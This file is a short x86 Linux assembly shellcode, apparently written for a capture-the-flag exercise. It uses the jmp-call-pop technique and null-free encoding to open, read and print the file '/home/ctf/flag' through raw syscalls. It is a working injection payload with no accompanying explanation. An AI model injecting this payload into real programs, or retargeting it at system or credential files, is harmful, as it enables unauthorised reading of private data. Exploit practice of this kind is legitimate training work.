section .data

buf times 0x40 db 0x20

global _start
_start:
  jmp En
St:
  xor eax, eax
  xor ecx, ecx
  xor edx, edx
  pop ebx
  mov [ebx + 14], al
  mov al, 5
  int 0x80
  mov ebx, eax
  mov ecx, esp
  mov dl, 0x40
  xor eax, eax
  mov al, 3
  int 0x80
  mov bl, 1
  mov ecx, esp
  mov dl, 0x40
  xor eax, eax
  mov al, 4
  int 0x80
  xor eax, eax
  mov al, 1
  xor ebx, ebx
  int 0x80
En:
  call St
  db '/home/ctf/flag', 0xa
